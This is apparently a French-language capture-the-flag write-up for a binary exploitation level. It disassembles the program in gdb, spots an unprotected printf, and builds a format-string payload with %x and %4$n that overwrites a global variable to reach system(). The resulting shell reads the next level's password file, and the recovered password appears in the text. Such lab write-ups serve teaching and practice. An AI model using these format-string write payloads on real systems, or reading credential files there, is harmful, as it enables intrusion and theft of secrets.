#level3

$./level3
test
test

Level3 attend un input et ensuite l'affiche.

Regardons un peu plus en détail.

$ gdb level3

> disas main

Dump of assembler code for function main:
0x0804851a <+0>: push %ebp
0x0804851b <+1>: mov %esp,%ebp
0x0804851d <+3>: and $0xfffffff0,%esp
0x08048520 <+6>: call 0x80484a4 <v>
0x08048525 <+11>: leave
0x08048526 <+12>: ret
End of assembler dump.

On voit qu'il appelle la fonction v.

Regardons v de plus près:

> disas v
> Dump of assembler code for function v:
> 0x080484a4 <+0>: push %ebp
> 0x080484a5 <+1>: mov %esp,%ebp
> 0x080484a7 <+3>: sub $0x218,%esp
> 0x080484ad <+9>: mov 0x8049860,%eax
> 0x080484b2 <+14>: mov %eax,0x8(%esp)
> 0x080484b6 <+18>: movl $0x200,0x4(%esp)
> 0x080484be <+26>: lea -0x208(%ebp),%eax
> 0x080484c4 <+32>: mov %eax,(%esp)
> 0x080484c7 <+35>: call 0x80483a0 <fgets@plt>
> 0x080484cc <+40>: lea -0x208(%ebp),%eax
> 0x080484d2 <+46>: mov %eax,(%esp)
> 0x080484d5 <+49>: call 0x8048390 <printf@plt>
> 0x080484da <+54>: mov 0x804988c,%eax
> 0x080484df <+59>: cmp $0x40,%eax
> 0x080484e2 <+62>: jne 0x8048518 <v+116>
> 0x080484e4 <+64>: mov 0x8049880,%eax
> 0x080484e9 <+69>: mov %eax,%edx
> 0x080484eb <+71>: mov $0x8048600,%eax
> 0x080484f0 <+76>: mov %edx,0xc(%esp)
> 0x080484f4 <+80>: movl $0xc,0x8(%esp)
> 0x080484fc <+88>: movl $0x1,0x4(%esp)
> 0x08048504 <+96>: mov %eax,(%esp)
> 0x08048507 <+99>: call 0x80483b0 <fwrite@plt>
> 0x0804850c <+104>: movl $0x804860d,(%esp)
> 0x08048513 <+111>: call 0x80483c0 <system@plt>
> 0x08048518 <+116>: leave
> 0x08048519 <+117>: ret
> End of assembler dump.

On voit que la fonction compare le contenu d'une variable à un 64 (0x40) avant d'executer la commande system.

Observons la variable comparée:

> x/s 0x804988c
> 0x804988c <m>: ""

On nt voit pas m dans la fonction.

Essayons de trouver m dans les globales:

> info variables

All defined variables:

Non-debugging symbols:
0x080485f8 _fp_hw
0x080485fc \_IO_stdin_used
0x08048734 **FRAME_END**
0x08049738 **CTOR_LIST**
0x08049738 **init_array_end
0x08049738 **init_array_start
0x0804973c **CTOR_END**
0x08049740 **DTOR_LIST**
0x08049744 **DTOR_END**
0x08049748 **JCR_END**
0x08049748 **JCR_LIST**
0x0804974c \_DYNAMIC
0x08049818 \_GLOBAL_OFFSET_TABLE_
0x0804983c **data_start
0x0804983c data_start
0x08049840 **dso_handle
0x08049860 stdin@@GLIBC_2.0
0x08049880 stdout@@GLIBC_2.0
0x08049884 completed.6159
0x08049888 dtor_idx.6161
0x0804988c m

m est donc une variable globale.

On doit reussir a initaliser m avec la valeur 64.

On voit qu'avant la comparaison, v appelle printf sans la securissé.

Donc on va profiter de ça.

Avec %x on va pouvoir remonter la stack et voir dans quelle adresse est écrit le buffer.

$ echo "AAAA %x %x %x %x %x" | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520

Donc le buffer est écrit dans la 4eme case de la stack dans "41414141".

On doit changer cette adresse pour 0x0804988c l'adresse de m.

$ python -c 'print "\x8c\x98\x04\x08" + "%x %x %x %x %x"' | ./level3
�200 b7fd1ac0 b7ff37d0 804988c 25207825

On va utiliser %n qui va ecrire dans l'adresse le nombre de bytes écrits, 4 bytes dans le cas présent. Il en manque donc 60, on va les rajouter et raccourcir la commande au passage.

$ python -c 'print "\x8c\x98\x04\x08" + "A"\*60 + "%4$n"' | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!

$ (python -c 'print "\x8c\x98\x04\x08" + "A"\*60 + "%4$n"'; cat -) | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
